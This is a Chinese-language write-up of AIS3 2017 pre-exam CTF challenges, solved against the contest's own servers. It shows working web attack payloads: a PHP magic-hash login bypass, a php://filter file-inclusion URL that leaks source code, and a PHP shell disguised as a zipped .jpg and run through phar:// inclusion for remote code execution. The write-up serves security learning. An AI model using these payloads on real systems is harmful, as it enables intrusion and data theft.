CTF/AIS3_2017/Pre_exam/Write_up.md


# CTF- write up AIS3 2017 

  * [Misc 2](#Misc2)
  * [Web 1](#Web1)
  * [Web 2](#Web2)
  * [Web 3](#Web3)
  * [Web 4](#Web4)
  * [Crypto 1](#Crypto1)
  * [Reverse 1](#Reverse1)
 
<h2 id = "Misc2">Misc 2</h2>
進入題目網址:

    https://quiz.ais3.org:31532/

畫面顯示如下提示: 

    I've sent you something :) 

打開網頁原始碼發現額外的提示: 
    
    <!--<img src="sudoku.png" />-->

但其實這一個會誤導人，該題根本和這個圖檔無關，只是這裡依然給了我一個想法是flag可能會是在目錄下的其他圖檔。
再往其他方向去看，找了一下**網站的header**，

![misc2](/CTF/AIS3_2017_writeup/pic/misc2.jpg)

將header 裡看到的密文帶進base64解碼
得到**S74G32.php**
進入該網址得到圖片，

    https://quiz.ais3.org:31532/S74G32.php

![misc2flag](/AIS3_2017_writeup/pic/pikapika.jpg)

flag就在裡面拉！

    AIS3{pika}
    
<h2 id = "Web1">Web 1</h2>
題目的提示:
    
    Didn't you see the flag?
網頁原始碼並沒有特別的提示，但想到剛剛的misc2 在header裡有問題，
所以同樣的進入header找線索
發現在**狀態代碼**上有問題，
先出現

    302 Found

之後才顯示

    200 OK

去查了一下302 Found 是什麼：

<https://www.wikiwand.com/zh-tw/HTTP_302>
    
    維基上的解釋：
    302 Found，原始描述短語為 Moved Temporarily，是HTTP協定中的一個狀態碼(Status Code)。可以簡單的理解為該資源原本確實存在，但已經被臨時改變了位置；換而言之，就是請求的資源暫時駐留在不同的URI下[1]，故而除非特別指定了快取頭部指示，該狀態碼不可快取。
    對於伺服器，通常會給瀏覽器傳送HTTPLocation頭部來重新導向到新的新位置。

大致理解完後，簡單來說是因為網頁被重新導向到另一個網頁被重新導向到另一個page，看到這裡後，我重新進入題目並檢查了一下網址發現：
    
    https://quiz.ais3.org:42351/index.html

進入題目後，他會**直接導向 index.html**，所以大概可以推測在前一個頁面應該藏有某些線索，
所以索性直接利用 **curl** 去看看前一個網頁源碼裡面有什麼：

    curl https://quiz.ais3.org:42351/   

果然得到flag:

    AIS3{As_Simple_As_Usual}
    
<h2 id = "Web2">Web 2</h2>
題目原始碼如下：
```sh
<?php
include("flag.php");

if (isset($_GET["source"])) {
    show_source(__FILE__);
    exit();
}

$db = array(
    array("username" => "delicia", "password" => "6d386d56781b744d31328faace811444"),
    array("username" => "earnest", "password" => "907d82744bb98e956f82077a20cf92d3"),
    array("username" => "chaya", "password" => "0c914720b899f04c3522a6a467d23e07"),
    array("username" => "carlos", "password" => "4a84296507efdac241f300b4676c8448"),
    array("username" => "celine", "password" => "b74f357a8ef07a954ef3c2b780f09309"),
    array("username" => "trena", "password" => "d8a7a3e0bee98a1315f1ebeb8a6cabe5"),
    array("username" => "otis", "password" => "ca3ace395c61849f13b0a12e939ba101"),
    array("username" => "kristyn", "password" => "467bbf3d08f6d7b46a169257d2f1190a"),
    array("username" => "meaghan", "password" => "df70b80ddd44e63bc5f4eb3c4f920e77"),
    array("username" => "lacresha", "password" => "aaef40f431754fbec001172f0ce714b9"),
    array("username" => "alleen", "password" => "6d8fdad086cee23270c45a06362d03e8"),
    array("username" => "marketta", "password" => "50da5753695a6ba0514bb38d351cae81"),
    array("username" => "charlette", "password" => "3b10f46067c305ba6a10d9d3ca68e56c"),
    array("username" => "golda", "password" => "05615438bb05818cf11abb7c4bc12033"),
    array("username" => "miki", "password" => "e99a9c9124c6b4e8a7d114c95106cbb1"),
    array("username" => "adelaide", "password" => "6197a1a44aac59234fab3c7fdc872b64"),
    array("username" => "yung", "password" => "06418dc6dad833585d54e81b340c0a99"),
    array("username" => "delcie", "password" => "5f1bc54558e89ad5078ffb56bda5f86b"),
    array("username" => "alisia", "password" => "ddc21c265a7536dcf6854f5fd744b2a2"),
    array("username" => "vicki", "password" => "6bf94c6f0f5a6fac2c6859bebe2de44f"),
    array("username" => "jarrod", "password" => "6f0b8474de3252bfda8177c7f81f5bc8"),
    array("username" => "liberty", "password" => "64b73e2569bb43e6d80fffa90327e5d6"),
    array("username" => "dani", "password" => "f8aa590cb16d8746d2530f2d6b082e88"),
    array("username" => "dillon", "password" => "cb2277c9f695cd4c4d8453b531329c69"),
    array("username" => "quinton", "password" => "e322aae4dd7de048f8a5827874dcaa9b"),
    array("username" => "caridad", "password" => "edf4bcb49c1bc2e0aa720ad25978de70"),
    array("username" => "lucas", "password" => "a551c048a50263748a98a3a914da202d"),
    array("username" => "sena", "password" => "0e959146861158620914280512624073"),
    array("username" => "deja", "password" => "590aea8ba65098dccb7ee6835039f949"),
    array("username" => "fiona", "password" => "8c15dd1dcd59386d2a813eaa9ac01945"),
    array("username" => "mechelle", "password" => "ca8087d12f12a9442e1c59942173fa58"),
    array("username" => "an", "password" => "cf0d72a68a70e78f78b4b97d0fef7d89"),
    array("username" => "chadwick", "password" => "e564ee0a33eedb3cb99a8fa363ff3d39"),
    array("username" => "sandi", "password" => "8f92e127efcd049303431724661cc51a"),
    array("username" => "leola", "password" => "aa01b9fa4db785a7a4422b069a0777dd"),
    array("username" => "enid", "password" => "881592be42a22ae1011ff21bd8da57f9"),
    array("username" => "dewitt", "password" => "35646ebd5bb1bdeb05a9989cd4e2317a"),
    array("username" => "tamala", "password" => "9e2932b9be2ce2fbe6679c704fa32370"),
    array("username" => "madelaine", "password" => "ae9608b773317fb14776a1f03004ed3f"),
    array("username" => "ivan", "password" => "2bc7fce377c6a9568afa03d92c902cd7"),
    array("username" => "demetrius", "password" => "bbb3778c0359cdb6ea78a9a184396fde"),
    array("username" => "nevada", "password" => "a443c85070f9b92c6639f63bf46cf465"),
    array("username" => "lawanda", "password" => "04680fefd56ef0b2606e8df32ca7e578"),
    array("username" => "nancee", "password" => "9e1bc7ff8116dbb522a1399ef9fbca2a"),
    array("username" => "alexia", "password" => "5699f2844f7e41da9cf98aed003be6dd"),
    array("username" => "porsha", "password" => "4f38dcc1120d8824de4db6d20c892072"),
    array("username" => "edda", "password" => "fe5cc1e65c1e34046d34b6fd325729b6"),
    array("username" => "lucy", "password" => "fda2dc38e34f89e3018483fb25d7c471"),
    array("username" => "gilbert", "password" => "54ea997a290c9b00f918aa5078f8afa1"),
    array("username" => "tamica", "password" => "7a210fab1fda43d6ab88db77a43ef2f2")
);

$msg = "";
if (isset($_POST["username"]) and isset($_POST["password"]))
{
    $username = (string)$_POST["username"];
    $password = (string)$_POST["password"];

    $success = false;
    foreach ($db as $row)
    {
        if ($username == $row["username"] and md5($password) == $row["password"])
        {
            $msg = "Successful login as $username. Here's your flag: ".$flag;
            $success = true;
            break;
        }
    }
    if (!$success)
    {
        $msg = "Invalid username or password.";
    }
}
?>
```

這題運用 **md5 collision 的原理**，以及 **PHP語法對於雙等號(==)比對不嚴謹的問題**
PHP 運用雙等號(==)進行比對，只要能夠比對成功前兩個字元，就會return ok
找到一個字串QNKCDZO其md5加密後0e830400451993494058024219903391
再從source code裡找到 **0e** 開頭的密文

```sh 
"username" => "sena"
"password" =>"0e959146861158620914280512624073"),
```
運用 sena/QNKCDZO 登入，get flag

    AIS3{Hey!Why_can_you_login_without_the_password???}
    
<h2 id = "Web3">Web 3</h2>
題目網址:
    
    https://quiz.ais3.org:23545/

該網站下隨一點選about 或是 首頁，並觀察網址:

    https://quiz.ais3.org:23545/?p=home
    https://quiz.ais3.org:23545/?p=about

這題運用的概念是PHP 的 filiter漏洞
上網找到了這篇:
    <https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/>

裡面提到以下的語法:
    
    php://filter/convert.base64-encode/resource=index

上述語法會將整個頁面的原始碼轉成base64的編碼，
將上述語法套用到我們這一題，由於都是要將首頁轉換，所以resource=index不用更改:

    https://quiz.ais3.org:23545/?p=php://filter/convert.base64-encode/resource=index

取得網頁原始碼的base64編碼

    Snoopy's AIS3
    About
    PD9waHAKLy8gZmxhZzE6IEFJUzN7Q3V0ZV9Tbm9vcHlfaXNfYmFjayEhPyE/ISE/fQoKCi8vIGRpc2FibGVkIGZvciBzZWN1cml0eSBpc3N1ZQokYmxhY2tsaXN0ID0gWyJodHRwIiwgImZ0cCIsICJkYXRhIiwgInppcCJdOwpmb3JlYWNoICgkYmxhY2tsaXN0IGFzICYkcykKICAgIHN0cmVhbV93cmFwcGVyX3VucmVnaXN0ZXIoJHMpOwoKJEZST01fSU5DTFVERSA9IHRydWU7CgokcGFnZXMgPSBhcnJheSgKICAgIC8vIGRpc2FibGVkCiAgICAvLyAidXBsb2FkZGRkZGRkIiA9PiAiVXBsb2FkcyIsCiAgICAiYWJvdXQiID0+ICJBYm91dCIKKTsKCmlmIChpc3NldCgkX0dFVFsicCJdKSkKICAgICRwID0gJF9HRVRbInAiXTsKZWxzZQogICAgJHAgPSAiaG9tZSI7CgoKaWYoc3RybGVuKCRwKSA+IDEwMCkKewogICAgZGllKCJwYXJhbWV0ZXIgaXMgdG9vIGxvbmciKTsKfQoKPz4KCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cjw/cGhwCmluY2x1ZGUgImhlYWRlci5waHAiOwppbmNsdWRlICRwIC4gIi5waHAiOwo/Pgo8Zm9vdGVyIGNsYXNzPSJmb290ZXIiPgogICAgPHA+wqkgY2VicnVzZnMgMjAxNzwvcD4KPC9mb290ZXI+CjwvYm9keT4KPC9odG1sPgo=
    
將上述base64碼拿來解碼後得到網頁原始碼，get flag:

    AIS3{Cute_Snoopy_is_back!!?!?!!?}
    
<h2 id = "Web4">Web 4</h2>
題目網址與上一題相同:
    
    https://quiz.ais3.org:23545/

根據上一題解碼出的網頁原始碼，可以找到以下這段

```sh  
    $pages = array(
    // disabled
    // "uploaddddddd" => "Uploads",
    "about" => "About"
    );
```

發現除了index和about之外，還有另一個upload頁面：
    
    https://quiz.ais3.org:23545/?p=uploaddddddd
    
進入上傳頁面，該頁面限制上傳的檔案只能是.jpg
其實強大的隊友在看到這題時找到了過去很類似的題目也貼給我看

<https://0x1337seichi.wordpress.com/2015/03/15/codgate-2015-ctf-quals-owlur-writeup-web-200/>

裡面介紹到了 phar:// 這個用法以及 scandir的運用
此時可以想得到這一題是要在jpg檔裡塞進塞進shell code，ㄧ下是參考網上大大們來撰寫的shell code
並將.php 的shell code先壓縮後再改成先壓縮後再改成.jpg

```sh
echo -n "<?php print_r( scandir('/')); echo  shell_exec('pwd'); ?> " > a.php && zip wtf.zip a.php && mv wtf.zip wtf.zip.jpg 
```

```sh
#a.php
<?php 
print_r( scandir('/')); #看到在根目錄下(/)所有的子目錄
echo  shell_exec('pwd'); #顯示目前所在的目錄位置 
?> 
```

透過上述方法我能看到在根目錄下的檔案有哪些
在思考一下就能想到要看的檔案位置應該要在網站根目錄
運用上一提的方法把Upload原始碼轉成base64編碼

    Snoopy's AIS3
    About
    PD9waHAKaWYgKCEgJEZST01fSU5DTFVERSkKICAgIGV4aXQoJ25vdCBhbGxvdyBkaXJlY3QgYWNjZXNzJyk7CgpmdW5jdGlvbiBSYW5kb21TdHJpbmcoKQp7CiAgICAkY2hhcmFjdGVycyA9ICIwMTIzNDU2Nzg5YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWiI7CiAgICAkcmFuZHN0cmluZyA9ICIiOwogICAgZm9yICgkaSA9IDA7ICRpIDwgOTsgJGkrKykgewogICAgICAgICRyYW5kc3RyaW5nIC49ICRjaGFyYWN0ZXJzW3JhbmQoMCwgc3RybGVuKCRjaGFyYWN0ZXJzKS0xKV07CiAgICB9CiAgICByZXR1cm4gJHJhbmRzdHJpbmc7Cn0KCiR0YXJnZXRfZGlyID0gImltYWdlcyI7CiR1cGxvYWRPayA9IGZhbHNlOwppZihpc3NldCgkX0ZJTEVTWyJmaWxlVG9VcGxvYWQiXSkpCnsKICAgICRmaWxlbmFtZSA9IGJhc2VuYW1lKCRfRklMRVNbJ2ZpbGVUb1VwbG9hZCddWyduYW1lJ10pOwogICAgJGltYWdlRmlsZVR5cGUgPSBwYXRoaW5mbygkZmlsZW5hbWUsIFBBVEhJTkZPX0VYVEVOU0lPTik7CiAgICBpZigkaW1hZ2VGaWxlVHlwZSA9PSAianBnIikKICAgIHsKICAgICAgICAkdXBsb2FkT2sgPSAxOwogICAgfQogICAgZWxzZQogICAgewogICAgICAgIGVjaG8gIjxjZW50ZXI+PHA+U29ycnksd2Ugb25seSBhY2NlcHQganBnIGZpbGU8L3A+PC9jZW50ZXI+IjsKICAgICAgICAkdXBsb2FkT2sgPSAwOwogICAgfQoKICAgICRmc2l6ZSA9ICRfRklMRVNbJ2ZpbGVUb1VwbG9hZCddWydzaXplJ107CiAgICBpZighKCRmc2l6ZSA+PSAwICYmICRmc2l6ZSA8PSAyMDAwMDApKQogICAgewogICAgICAgICR1cGxvYWRPayA9IDA7CiAgICAgICAgZWNobyAiPGNlbnRlcj48cD5Tb3JyeSwgdGhlIHNpemUgdG9vIGxhcmdlLjwvcD48L2NlbnRlcj4iOwogICAgfQp9CgppZigkdXBsb2FkT2spCnsKICAgICRpcCA9ICRfU0VSVkVSWyJSRU1PVEVfQUREUiJdOwoKICAgICRkaXIgPSAiJHRhcmdldF9kaXIvJGlwIjsKICAgIGlmKCFpc19kaXIoJGRpcikpCiAgICAgICAgbWtkaXIoJGRpcik7CgogICAgJG5ld2lkID0gUmFuZG9tU3RyaW5nKCk7CiAgICAkbmV3cGF0aCA9ICIkZGlyLyRuZXdpZC5qcGciOwogICAgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJmaWxlVG9VcGxvYWQiXVsidG1wX25hbWUiXSwgJG5ld3BhdGgpKQogICAgewogICAgICAgIGhlYWRlcigiTG9jYXRpb246ICRuZXdwYXRoIik7CiAgICAgICAgZXhpdCgpOwogICAgfQogICAgZWxzZQogICAgewogICAgICAgIGVjaG8gIjxjZW50ZXI+PHA+U29tZXRoaW5nIGJhZCBoYXBwZW5kLCBwbGVhc2UgY29udGFjdCB0aGUgQUlTMyBhZG1pbiB0byBzb2x2ZSB0aGlzPC9wPjwvY2VudGVyPiI7CiAgICB9Cn0KPz4KCjwhLS0gUGFnZSBDb250ZW50IC0tPgo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPCEtLSBNYXJrZXRpbmcgSWNvbnMgU2VjdGlvbiAtLT4KICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImNvbnRyb2wtbGFiZWwiPlNlbGVjdCBhIGdvb2QgU25vb3B5IHBpY3R1cmUgKEpQRyBvbmx5KTwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgaWQ9ImlucHV0LTEiIG5hbWU9ImZpbGVUb1VwbG9hZCIgdHlwZT0iZmlsZSIgY2xhc3M9ImZpbGUiPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQ+CiAgICAvLyBpbml0aWFsaXplIHdpdGggZGVmYXVsdHMKICAgICQoIiNpbnB1dC0xIikuZmlsZWlucHV0KCk7CgogICAgLy8gd2l0aCBwbHVnaW4gb3B0aW9ucwogICAgJCgiI2lucHV0LTEiKS5maWxlaW5wdXQoeydzaG93VXBsb2FkJzpmYWxzZSwgJ3ByZXZpZXdGaWxlVHlwZSc6J2FueSd9KTsKICAgIDwvc2NyaXB0Pgo8L2Rpdj4K
    © cebrusfs 2017
    
會得到以下會得到以下source code

```sh
<?php
if (! $FROM_INCLUDE)
    exit('not allow direct access');

function RandomString()
{
    $characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $randstring = "";
    for ($i = 0; $i < 9; $i++) {
        $randstring .= $characters[rand(0, strlen($characters)-1)];
    }
    return $randstring;
}

$target_dir = "images";
$uploadOk = false;
if(isset($_FILES["fileToUpload"]))
{
    $filename = basename($_FILES['fileToUpload']['name']);
    $imageFileType = pathinfo($filename, PATHINFO_EXTENSION);
    if($imageFileType == "jpg")
    {
        $uploadOk = 1;
    }
    else
    {
        echo "<center><p>Sorry,we only accept jpg file</p></center>";
        $uploadOk = 0;
    }

    $fsize = $_FILES['fileToUpload']['size'];
    if(!($fsize >= 0 && $fsize <= 200000))
    {
        $uploadOk = 0;
        echo "<center><p>Sorry, the size too large.</p></center>";
    }
}

if($uploadOk)
{
    $ip = $_SERVER["REMOTE_ADDR"];

    $dir = "$target_dir/$ip";
    if(!is_dir($dir))
        mkdir($dir);

    $newid = RandomString();
    $newpath = "$dir/$newid.jpg";
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $newpath))
    {
        header("Location: $newpath");
        exit();
    }
    else
    {
        echo "<center><p>Something bad happend, please contact the AIS3 admin to solve this</p></center>";
    }
}
?>
```

從source code可以看到圖片上傳的位置
之後觀察一下我們上傳完的jpg確認檔案位置是否正確
並修改 a.php

```sh
<?php
echo  shell_exec('ls');//執行ls指令
?>
```

看到目錄底下有一個奇怪的檔案

```sh
#b.php
<?php echo file_get_contents('the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l') ?> 
```

將b.php 壓縮後副檔名改.jpg

```sh
echo -n "<?php 
echo file_get_contents('the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l') 
?> 
 " > a.php && zip wtf.zip a.php && mv wtf.zip wtf.zip.jpg 
```

並上傳後觀察網址：

https://quiz.ais3.org:23545/images/140.118.148.152/rxvLCKtZz.jpg

修改網址，運用phar://來執行來執行shell code:

https://quiz.ais3.org:23545/?p=phar://images/140.118.148.152/rxvLCKtZz.jpg/b

上傳完上傳完shell code後，flag就噴出拉：

    AIS3{RCEEEEEEEEE_is_soooooooooo_funnnnnnnnnnnn!?!!?!!!}
    
<h2 id = "Reverse1">Reverse 1</h2>

Olleydb打開來慢慢找吧！！

<h2 id = "Crypto1">Crypto 1</h2>

題目如下：
```sh
#include <stdio.h>
#include <string.h>

int main()
{
	int val1 = ?????????, val2 = ?????????, val3 = ???????, val4 = ??????, i, *ptr;
	char flag[29] = "????????????????????????????"; // Hint: The flag begins with AIS3
	
	for(i = 0, ptr = (int*)flag ; i < 7 ; ++i)
		printf("%d\n", ptr[i] ^ val1 ^ val2 ^ val3 ^ val4);
	
	/*
	964600246
	1376627084
	1208859320
	1482862807
	1326295511
	1181531558
	2003814564
	*/
	return 0;
}
```

該題是XOR漏洞，其原理是在說當運用同樣的當運用同樣的key 進行XOR時會產生

```sh
#AIS3 Crypto1
import sys
crypto_list=[964600246, 1376627084, 1208859320, 1482862807, 1326295511,1181531558,2003814564]

xor=int('AIS3'[::-1].encode('hex'), 16)^crypto_list[0]
print 'xor:',xor

flag=''
for key in crypto_list:
	print hex(key^xor)
```
執行完

```sh
xor: 170780919
0x33534941
0x5820417b
0x4220524f
0x524f5820
0x45204120
0x4c415551
0x7d422053

```
將hex code 轉回 ASCII
把順序重新編排一下

```sh
0x41495333
0x7b412058
0x4f522042
0x20584f52
0x20412045
0x5155414c
0x5320427d
```

Get flag
    
    AIS3{A XOR B XOR A EQUALS B}
